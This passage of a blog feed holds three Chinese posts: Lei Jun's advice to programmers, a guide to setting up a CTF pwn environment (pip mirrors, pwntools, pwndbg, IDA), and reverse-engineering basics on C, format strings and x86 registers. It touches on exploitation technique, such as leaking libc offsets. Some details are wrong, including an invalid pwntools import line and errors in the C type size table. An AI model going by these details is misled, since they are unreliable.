      
        <content type="html"><![CDATA[<h1>雷军的十年编程之路自述，给程序员的几点建议</h1><blockquote><p>雷军自述：我并非天生喜欢写程序，上高中时也没有想过程序员的生活。我学电脑非常偶然，小时好友上大学时选择了计算机系，为了和这个朋友有更多的共同语言，我也选择了计算机系，可是当我学会一些后，发现自己特别喜欢写程序。我是八七年上的武汉大学计算机系，大一下学期才有专业课。当我有资格上机的时候，发现电脑世界太美妙，就一头扎进去。大学毕业后，分到研究所，不太适应那里的气氛，就在1992年初加入金山软件，开始了职业程序员的生涯。后来成了金山软件研发部门的主管，但我一直都是一线的程序员</p></blockquote><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220109193156605.png" alt="image-20220109193156605"></p><blockquote><p>做自己最擅长、最喜欢的事</p></blockquote><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220109193243055.png" alt="image-20220109193243055"></p><blockquote><p>我刚接触电脑就发现电脑的妙处，电脑远没有人那么复杂。如果你的程序写得好，你就可以和电脑处好关系，就可以指挥电脑干你想干的事。这个时候你是十足的主宰。每每你坐在电脑面前，你就是在你的王国里巡行，这样的日子简直就是天堂般的日子。电脑里的世界很大，编程人是活在自己想象的王国里。你可以想象到电脑里细微到每一个字节、每一个比特的东西。</p><p>开始的时候，我们觉得我们没有什么不能做的(现在还能听到这样的豪言壮语)，而且更要命的是好象我们特别聪明，特别适合开发软件，比老外强得多。当我们真正接触那些杰出的开发人员的时候，发现他们太厉害了，都有十多年的开发经验。虽然也有很多年轻人做了很多好东西，但决大多数的产品出自这些有丰富开发经验的程序员的手。刚毕业的时候，编程不仅仅是爱好，而且也成了一辈子的工作。整天不知道写些什么东西，觉得特别没劲，找不到感觉，特别灰心。后来，才明白，只有全身心地投入，程序才会有感觉。</p><p>写程序的活特别费脑子，也特别累，但我喜欢，可以肯定我会干上一辈子，虽然我没有打算一生只干这一件事。用一生来编程序是一件既容易又困难的事。如果碌碌无为，为交差写点程序，这样的日子太好混了。但如果想全身心地写程序，写十年就不是一件容易的事。现在我不少朋友都洗手了，有时我也想“用什么电脑呀，Windows  外的世界不是也很大吗?”。面对电脑的时候，立刻顿悟：写程序还是自己最擅长的事，也是最喜欢的事。</p><blockquote><p><strong>建议一：不喜欢写程序的人早点转行，不要勉强自己，免得误人误己。</strong></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220109193403043.png" alt="image-20220109193403043"></p><p>有的人学习编程技术，是把高级程序员做为追求的目标，甚至是终身的奋斗目标。后来参与了真正的商品化软件开发后，反而困惑了，茫然了。</p><p>一个人只要有韧性和灵性，有机会接触并学习电脑的编程技术，就会成为一个不错的程序员。刚开始写程序，这时候学得多的人写的好，到了后来，大家都上了一个层次，谁写的好只取决于这个人是否细心、有韧性、有灵性。掌握多一点或少一点，很快就能补上。成为一个高级程序员并不是件困难的事。</p><p>当我上学的时候，高级程序员也曾是我的目标，我希望我的技术能得到别人的承认。后来发现无论多么高级的程序员都没用，关键是你是否能够出想法出产品，你的劳动是否能被社会承认，能为社会创造财富。成为高级程序员绝对不是追求的目标。</p><p><strong>建议二：时刻保持好奇心，不要局限在技术本身，多花点精力关注用户</strong></p><p>计算机技术更新换代非常快，每年都有各种各样的新技术出现。需要时刻保持好奇心，不断学习各种新的东西，才能在未来的几十年职业生涯中不落伍。人的精力有限，高手往往工作压力也比较大，如何在有限的时间内掌握整个行业动态，的确不是简单的事情。我的经验是经常看业内的各种技术杂志，参加各种聚会，可以节约很多时间。最重要的是，交几个博学的技术高手，多和他们交流，一定受益匪浅!</p><p>现在的软件研发越来越强调团队协作，不少团队都配置了专门的需求分析工程师、用户界面及用户体验的设计师，软件研发的分工越来越细。很多程序员以为只要把技术搞好，不用管用户需求和用户体验。实际上，需求方案及界面方案不可能写得非常细，具体的实施还是程序员自己来实现的。这个时候，好坏的差距很快就体现出来了。我们写程序的最终目的是满足用户需求，不是简单完成需求规划方案中的功能。所以，程序员一定要认真揣摩用户心理，能明白用户的真实需求。</p><p>我强烈建议程序员不要仅仅局限在技术本身，还需要多点精力考虑和用户相关的问题，学会洞察用户的需求，并努力设计好用易用的产品。做到这点的程序高手，就算创业也有很大的成算了。</p><p><strong>编程是技术，更是艺术</strong></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220109193544603.png" alt="image-20220109193544603"></p><p>有人认为编程是一种熟练工种，也有人把编程说成是艺术创作。</p><p>我们换个工种来看，石匠应该是熟练工种，属于工人，更和艺术似乎沾不上边。但正是这些石匠，给我们留下多少文物古迹，如乐山大佛、莫高窟等等。应该说这些石匠给我们留下了无穷的文化财产。现代软件工业已具相当规模，很多软件的完成需要的是大兵团作战。一名普通程序员接受编写某一模块的任务后，往往只是写代码，发挥的余地很小。在大项目中，很多程序员只能了解到和自己所编模块相关的很局部的细节，另外还受到开发环境的限制，真的很难体会到自己在从事&quot;艺术&quot;创造，更多的时候是感到自己在从事重体力劳动。有的时候还担心自己苦苦参与的这个项目究竟有没有意义，是不是在同类产品中有竞争力，会不会开发出来以后就因为硬件的发展，操作系统的换代而过时……</p><p>编程应该说两种属性都有。编程不仅仅是技术，也还是艺术。编程是技术活，才有可能大规模进行，才会有软件工程和软件工厂。也正是编程是艺术，才会有如此多的好产品，让大家如痴如醉。</p><p><strong>建议三：必须像工匠一样写够十万行代码，又须像写诗一样来写代码</strong></p><p>程序员像木工一样，熟能生巧。程序员必须写足够代码量的程序，才会有感觉，这是一个苦力活，没有任何捷径可走。</p><p>计算机是一门实践性的科学，没有动手能力做支撑，很难做出好的科研成果。我的一个学长是美国卡内基梅隆大学的博士，卡内基梅隆大学计算机系在全世界都非常出名，他说每个博士生必须写十万行代码才能毕业，卡内基梅隆大学博士生进任何一个大企业基本不用面试。而国内培养的大部分研究生、博士生，动手能力都偏弱。没有写过足够代码量的程序员，想成为高手是不可能的，只能纸上谈兵!</p><p>那么，怎样像写诗一样写代码呢?很简单，买几本经典的编程书，把书上所有例程全部重新写一遍，逐个比较和书上范例的差距，一步一步改善自己编程的风格和技巧。时间长了，自然就能写出像书上例程一样的代码，甚至可以比书上写得好。基础扎实后，多看看Linux等系统级的源代码，看看高手是如何写的，就有感觉了。通读一下MSDN中所有的资料，这样就“读书破万卷，下笔如有神”。</p><p>还有，一定要牢记软件工程的铁律：可能出错的地方一定会出错。每个变量都做初始化，引用每个参数都要做有效性检查，在可能出错的每个地方都要做边界条件检查，这样开发出来的程序一定会稳固很多，就是出错也很容易修改。野路子出来的高手，一般开发速度很快，但做完后Bug会很多，经常需要很长时间修改。而真正的高手，追求的境界是Bugfree  code(零缺陷代码)。</p></blockquote></blockquote><blockquote><p>看完内心很平静</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 故事 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn环境和pip换源</title>
      <link href="//f00f6070.html"/>
      <url>//f00f6070.html</url>
      
        <content type="html"><![CDATA[<h1>第一章 pwn工具安装和环境配置</h1><p>首先ctf中pwn题一般都是在虚拟机Linux系统里面做题研究</p><p>网上其实有一些别人修改过专用pwn的虚拟机，我用过，虽然内置了一些工具，但用起来不怎么方便非常别捏（登录系统的密码都要受限于人家），所以还是自己搞还是舒服些</p><p>至于虚拟机安装，我用的乌班图ubuntu的，我用的最新版，什么版本基本上都可以，只要不要太老的版本就行，因为ubuntu内置python，老版本可能内置的是python2，下面有的工具python2版本的工具已经停止维护了比如pwntools</p><p>怎么安装ubuntu呢，游览器搜索ubuntu<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104141613907.png" alt="image-20220104141613907"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104141706732.png" alt="image-20220104141706732"></p><p>点一下这个就会弹窗出来下载文件（是一个iso文件）</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104141808851.png" alt="image-20220104141808851"></p><p>下载即可，安装的话其实也比较简单，vm里面安装的时候引用iso文件安装即可，安装过程比较久，耐心等一下</p><p>下面介绍一下pip换源，为什么要换源呢，因为原始的pip源服务器是在国外，还有一些原因，我国GFW，不能再继续说了</p><p>其实最重要的原因是5kb/s和每秒的网速5mb/s下载速度选哪个吧。我们换源目的就是下载速度快一点，废话不多说了</p><p>先列出一些常用源</p><pre><code>阿里云     http://mirrors.aliyun.com/pypi/simple 中国科技大学   https://pypi.mirrors.ustc.edu.cn/simple豆瓣(douban)http://pypi.douban.com/simple 清华大学     https://pypi.tuna.tsinghua.edu.cn/simple 中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple</code></pre><p>​<br>下面分享两种换源（ 临时换源  和 永久换源）</p><ol><li><p>首先临时换源（其实也是加速的意思）</p><p>​在终端命令行里面输入下面这一串指令（Windows和Linux都是一样的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install xxx(这里输入你想安装的库) -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>​举个例子吧，安装pwntools<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104144121359.png" alt="image-20220104144121359"></p></li><li><p>永久换源</p><ul><li><p>windows永久换源</p><ul><li><p>打开文件管理器输入%APPDATA%<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104144429757.png" alt="image-20220104144429757"></p></li><li><p>然后回车，其实这个文件夹是隐藏文件夹，那么在文件管理器里面点击查看，然后点击勾选隐藏项目，然后顺着这个目录可以找到的的<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104144513529.png" alt="image-20220104144513529"></p></li><li><p>接下里就是新建一个文件夹，放我们pip换源文件，点击空白处右键新建文件夹，或者快捷键ctrl + shift +n键创建一个文件夹取名为pip<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104145135454.png" alt="image-20220104145135454"></p></li><li><p>然后<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104145300381.png" alt="image-20220104145300381"></p></li><li><p>把名字和后缀改成pip.ini<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104145359874.png" alt="image-20220104145359874"></p></li><li><p>然后用记事本打开输入这一串代码然后保存即可（Windows永久换源就完成了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout = 6000</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Linux永久换源（其实原理和windows一样的）</p><ul><li><p>步骤<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104150848161.png" alt="image-20220104150848161"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">[install]</span><br><span class="line">trusted-host = mirrors.aliyun.com</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[global]  </span><br><span class="line"> </span><br><span class="line">timeout = 6000  </span><br><span class="line"> </span><br><span class="line">index-url = http://pypi.douban.com/simple/  </span><br><span class="line"></span><br><span class="line">[install]  </span><br><span class="line"> </span><br><span class="line">use-mirrors = true  </span><br><span class="line"> </span><br><span class="line">mirrors = http://pypi.douban.com/simple/  </span><br><span class="line"> </span><br><span class="line">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure></li><li><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104150601785.png" alt="image-20220104150601785"></p></li><li><p>这个是我以前弄得清华源，这一串代码也可以</p></li><li><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104150652250.png" alt="image-20220104150652250"></p></li><li><p>验证我们是否成功，随便安装一个库，如果下面出现了我们换源的链接就代表我们成功了，网速嗖嗖的<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104151248569.png" alt="image-20220104151248569"></p></li></ul></li></ul></li></ol><h2 id="1-IDA-Pro">1. IDA Pro</h2><p>这款软件学过逆向的都知道，是一款非常强大的反编译工具，功能非常强大，安装的话，可以在我的公众号thestar0里面输入ida弹出链接下载，有个需要注意的地方就是不要把软件放到中文目录下，否则反编译的时候必定报错，还有就是有的人喜欢将系统的用户名用中文，这个也是有的人即使没有把文件放到中文目录，反编译时候依然报错</p><h2 id="2-pwntools">2. pwntools</h2><p>这个其实不是一个软件，本质是一个python库，功能就是我们最后pwn题攻击模块，用法和python库用法一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="keyword">import</span> pwntools *</span><br></pre></td></tr></table></figure><p><strong>pwntools</strong>：简单来说就以一整套pwn工具集，涵盖了pwn题利用脚本所需要的各种工具。包括方便的IO交互函数，ROP、格式化字符串等利用的自动化工具，shellcode生成器等等。pwntools是目前最好用也是仅有的大型pwn利用框架。能节省大量编写脚本的时间。</p><p>安装： pip install pwntools   (就是这么简单)安装过程非常的舒服</p><p>pwntools工具里面包含了pwn的工具ROPgadget（程序中搜索ROP链的工具）和checksec(功能是检查安全性保护，能报出相应程序的信息)</p><h2 id="3-GDB（动态调试）">3.GDB（动态调试）</h2><ol><li><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb</span><br></pre></td></tr></table></figure></li><li><p>gdb的几个插件</p><ul><li><p>pwmdbg</p><ul><li><p>安装可以去github里的pwngdb库里面找安装方式（一步步输入下面的命令，执行安装即可）</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104152837822.png" alt="image-20220104152837822"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg（这些命令一步步敲就行了，git好像需要下载才能下载github的文件如果报错试一下这个sudo apt install git）</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></li><li><p>验证安装成功，终端命令行输入gdb<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104153043815.png" alt="image-20220104153043815"></p></li><li><p>下面是gdb-pwndbg$就是成功了，我这里是peda是因为用的另一个gdb插件</p></li></ul></li><li><p>peda</p><ul><li>同理，也可以去github下面一样的安装步骤</li></ul></li></ul></li></ol><h2 id="4-one-gadget">4. one_gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="5-lieanu">5. lieanu</h2><p>版本较老，适配的是pyhon2，一样上github自行安装</p><h2 id="6-libcSearcher-shell脚本">6.libcSearcher(shell脚本)</h2><p>某个大佬的写的shell脚本</p><p>还有个大佬直接将shell脚本集成到库里面了，安装和用法如下：</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220104154719058.png" alt="image-20220104154719058"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向基础一</title>
      <link href="//cfb8545f.html"/>
      <url>//cfb8545f.html</url>
      
        <content type="html"><![CDATA[<h1>第一章 c/c++语言基础</h1><h2 id="1-从源码到可执行文件"><strong>==1. 从源码到可执行文件==</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$gcc hello.c</span><br><span class="line">$./a.out</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><blockquote><p>linux下gcc的编译过程分为4步</p><ol><li><p>预处理（Preprocessing）</p></li><li><p>编译（Compilation）</p></li><li><p>汇编 （Assembly）</p></li><li><p>链接（Linking）</p><blockquote><p>预编译过程：主要处理源代码中以 “#” 开始的预编译指令： 将所有的 “#define” 删除，并且展开所有的宏定义。 处理所有条件预编译指令，如 “#if”、“#ifdef”、“#elif”、“#else”、“#endif”。 处理 “#include” 预编译指令，将被包含的文件插入到该预编译指令的位置。注意，该过程递归执行。 删除所有注释。 添加行号和文件名标号。 保留所有的 #pragma 编译器指令。</p><p>编译过程:就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化 后生成相应的汇编代码文件。</p><p>汇编过程：汇编器将汇编代码转变成机器可以执行的指令</p><p>链接过程：链接过程主要包括地址和空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重 定向（Relocation）等</p></blockquote></li></ol></blockquote><hr><p>==gcc 默认使用动态链接==</p><p>生成的 a.out 实际上是共享目标文件</p><p>细节在ELF文件里面再说</p><h2 id="2-C语言标准库"><strong>==2. C语言标准库==</strong></h2><blockquote><p>C 运行库（CRT）是一套庞大的代码库，以支撑程序能够正常地运行。其中 C 语言 标准库占据了最主要地位。</p></blockquote><blockquote><p>常用的标准库文件头：</p><p>标准输入输出（stdio.h）</p><p>字符操作（ctype.h）</p><p>字符串操作（string.h）</p><p>数学函数（math.h）</p><p>实用程序库（stdlib.h）</p><p>时间／日期（time.h）</p><p>断言（assert.h）</p><p>各种类型上的常数（limits.h &amp; float.h）</p><p>变长参数（stdarg.h）</p><p>非局部跳转（setjmp.h）</p></blockquote><blockquote><p>在漏洞利用的过程中，通常我们通过计算目标函数地址相对于已知函数地址在同一 个 libc 中的偏移，来获得目标函数的虚拟地址，这时我们需要让本地的 libc 版本和 远程的 libc 版本相同，可以先泄露几个函数的地址，然后在 <a href="http://libcdb.com">libcdb.com</a> 中进行搜索 来得到。</p></blockquote><h2 id="3-整数表示"><strong>==3. 整数表示==</strong></h2><blockquote><p>默认情况下，C 语言中的数字是有符号数，下面我们声明一个有符号整数和无符号整数：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> var1 = <span class="number">0</span>;<span class="comment">//有符号整数</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> var2 = <span class="number">0</span>;<span class="comment">//无符号整数</span></span><br></pre></td></tr></table></figure><ul><li><p>==有符号整数==</p><ul><li><blockquote><p>可以表示为正数或负数 包括0</p></blockquote></li><li><blockquote><p>int 的范围： -2,147,483,648 ~ 2,147,483,647</p></blockquote></li></ul></li><li><p>==无符号整数==</p><ul><li><blockquote><p>只能表示为零或正数</p></blockquote></li><li><blockquote><p>unsigned int 的范围： 0 ~ 4,294,967,295</p></blockquote></li></ul></li></ul><blockquote><p>signed 或者 unsigned 取决于整数类型是否可以携带标志 +/-</p></blockquote><ul><li>Signed<ul><li>int</li><li>signed int</li><li>int long</li></ul></li><li>Unsigned<ul><li>unit</li><li>unsigned int</li><li>unsigned long</li></ul></li></ul><blockquote><p>在 signed int 中，二进制最高位被称作符号位，符号位被设置为 1 时，表示值为负，当设置为 0 时，值为非负：</p></blockquote><p><strong>二进制补码以一种适合于二进制加法器的方式来表示负数，当一个二进制补码形式 表示的负数和与它的绝对值相等的正数相加时，结果为 0。首先以二进制方式写出 正数，然后对所有位取反，最后加 1 就可以得到该数的二进制补码</strong></p><p>编译器需要根据变量类型信息编译成相应的指令：</p><ul><li>==有符号指令==<ul><li>IDIV：带符号除法指令</li><li>IMUL：带符号乘法指令</li><li>SAL：算术左移指令（保留符号）</li><li>SAR：右移右移指令（保留符号）</li><li>MOVSX：带符号扩展传送指令</li><li>JL：当小于时跳转指令</li><li>JLE：当小于或等于时跳转指令</li><li>JG：当大于时跳转指令</li><li>JGE：当大于或等于时跳转指令</li></ul></li><li>==无符号指令==<ul><li>DIV：除法指令</li><li>MUL：乘法指令</li><li>SHL：逻辑左移指令</li><li>SHR：逻辑右移指令</li><li>MOVZX：无符号扩展传送指令</li><li>JB：当小于时跳转指令</li><li>JBE：当小于或等于时跳转指令</li><li>JA：当大于时跳转指令</li><li>JAE：当大于或等于时跳转指令</li></ul></li></ul><table><thead><tr><th style="text-align:center">C语言数据类型</th><th style="text-align:center">最小值</th><th style="text-align:center">最大值</th><th style="text-align:center">最小大小</th></tr></thead><tbody><tr><td style="text-align:center">char</td><td style="text-align:center">-128</td><td style="text-align:center">127</td><td style="text-align:center">8bits</td></tr><tr><td style="text-align:center">short</td><td style="text-align:center">-32768</td><td style="text-align:center">32767</td><td style="text-align:center">16bits</td></tr><tr><td style="text-align:center">int</td><td style="text-align:center">-2147483648</td><td style="text-align:center">2147483647</td><td style="text-align:center">16bits</td></tr><tr><td style="text-align:center">long</td><td style="text-align:center">-2147483648</td><td style="text-align:center">2147483647</td><td style="text-align:center">36bits</td></tr><tr><td style="text-align:center">long long</td><td style="text-align:center">-9223372036854775808</td><td style="text-align:center">9223372036854775808</td><td style="text-align:center">64bits</td></tr></tbody></table><h2 id="4-格式化输出函数">==4. 格式化输出函数==</h2><p>C 标准中定义了下面的格式化输出函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fprintf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dprintf</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">snprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> size, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vprintf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfprintf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vdprintf</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsnprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> size, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_lis</span></span></span><br><span class="line"><span class="params"><span class="function">t ap)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>fprintf() 按照格式字符串的内容将输出写入流中。三个参数为流、格式字 符串和变参列表。</li><li>printf() 等同于 fprintf() ，但是它假定输出流为 stdout 。</li><li>sprintf() 等同于 fprintf() ，但是输出不是写入流而是写入数组。在写 入的字符串末尾必须添加一个空字符。</li><li>snprintf() 等同于 sprintf() ，但是它指定了可写入字符的最大值 size 。当 size 大于零时，输出字符超过第 size-1 的部分会被舍弃而 不会写入数组中，在写入数组的字符串末尾会添加一个空字符。</li><li>dprintf() 等同于 fprintf() ，但是它输出不是流而是一个文件描述符 fd 。</li><li>vfprintf() 、 vprintf() 、 vsprintf() 、 vsnprintf() 、 vdprintf () 分别与上面的函数对应，只是它们将变参列表换成了 va_list 类型的参 数。</li></ul><h2 id="5-格式化字符串">==5. 格式化字符串==</h2><blockquote><p>格式字符串是由普通字符（ordinary character）（包括 % ）和转换规则 （conversion specification）构成的字符序列。普通字符被原封不动地复制到输出 流中。转换规则根据与实参对应的转换指示符对其进行转换，然后将结果写入输出流中。</p></blockquote><p>一个转换规则有可选部分和必需部分组成：</p><blockquote><p>%[ 参数 ] [ 标志 ] [ 宽度 ] [ .精度 ] [ 长度 ] 转换指示符//就是%d那些%f,%lf之类%.6f等等</p></blockquote><p>必须会的转化指示符</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107143642483.png" alt=""><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107143816020.png" alt="image-20220107143816020"><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220107143845765.png" alt="image-20220107143845765"></p><h1>第二章 x86/x64汇编基础</h1><p>IA-32 体系结构提供了 16 （8+6+1+1）个基础寄存器，可分为下面几组：</p><ul><li>==通用寄存器==：8 个通用寄存器用于存储操作数、运算结果和指针。</li><li>==段寄存器==：包括 6 个段选择器。</li><li>==EFLAGS 寄存器==：用于显示程序执行的状态和允许对处理器进行有限的（应用 层）控制。</li><li>==EIP 寄存器==：包含一个 32 位的指针，指向下一条被执行的指令</li></ul><p>==通用寄存器==</p><ul><li><p>EAX：操作数和结果数据的累加器。</p></li><li><p>EBX：指向 DS 段中数据的指针。</p></li><li><p>ECX：用于字符串和循环操作的计数器。</p></li><li><p>EDX：I/O 指针。</p></li><li><p>ESI：指向由 DS 寄存器指向的段中的数据的指针；字符串操作的源指针。</p></li><li><p>EDI：指向由 ES 寄存器指向的段中的数据（或目标地址）的指针；字符串操作的目标指针。</p></li><li><p>ESP：栈指针（位于 SS 段）。 EBP：指向栈上数据的指针（位于 SS 段)。</p><blockquote><p>建议先记住有8种寄存器，因为单词记住就行，功能用到的时候再去记</p></blockquote></li></ul><p>==段寄存器==</p><p>段寄存器用于保存 16 位的段选择器。段选择器是一种特殊的指针，用于确定内存 中某个段的位置</p><p>==EFLAGS 寄存器==（标志位寄存器）</p><ul><li>状态标志<ul><li>CF（bit 0）：进位标志，用于表示无符号数运算是否产生进位或者借位， 如果产生了进位或借位则值为 1，否则值为 0。</li><li>PF（bit 2）：奇偶标志，用于表示运算结果中 1 的个数的奇偶性，偶数个 1 时值为 1，奇数个 1 时值为 0。</li><li>AF（bit 4）：辅助进位标志，在字操作时标记低位字节（低 4 位）是否向 高位字节（高 4 位）进位或借位。</li><li>ZF（bit 6）：零标志，用于表示运算结果是否为 0，结果为 0 时其值置 1，否则置 0。</li><li>SF（bit 7）：符号标志，用来标记有符号数运算结果是否小于 0，小于 0 时置 1，否则置 0。</li><li>OF（bit 11）：溢出标志，用于表示有符号运算结果是否溢出，发生溢出 时置 1，否则置 0。</li></ul></li><li>DF（bit 10）：方向标志，决定串操作指令执行时指针寄存器的调整方向</li><li>系统标志和 IOPL 域<ul><li>TF（bit 8）：跟踪标志，用于程序调试，置 1 时 CPU 处于单步执行状 态，置 0 时处于连续工作状态。</li><li>IF（bit 9）：中断允许标志，决定 CPU 是否响应 CPU 外部的可屏蔽中断 发出的中断请求，置 1 时可以响应中断，置 0 时不响应中断。</li><li>IOPL（bits 12,13）：I/O 特权标志，用于表示当前进程的 I/O 特权级别， 只有当前进程的 CPL 小于或等于 IOPL 时才能访问 I/O 地址空间，只有 CPL 为 0 时才能修改 IOPL 域。</li><li>NT（bit 14）：嵌套任务标志，置 1 时表示当前任务是在另一个任务中嵌 套执行，置 0 时表示非嵌套。</li><li>RT（bit 16）：恢复标志，用于表示是否响应指令断点，置 1 禁用指令断 点，置 0 允许指令断点。</li><li>VM（bit 17）：虚拟 8086 模式标志，用于表示进程是运行在虚拟 8086 模式还是保护模式，置 1 运行在虚拟 8086 模式，置 0 运行在保护模式。</li><li>AC（bit 18）：对齐检测标志，与 CR0 寄存器的 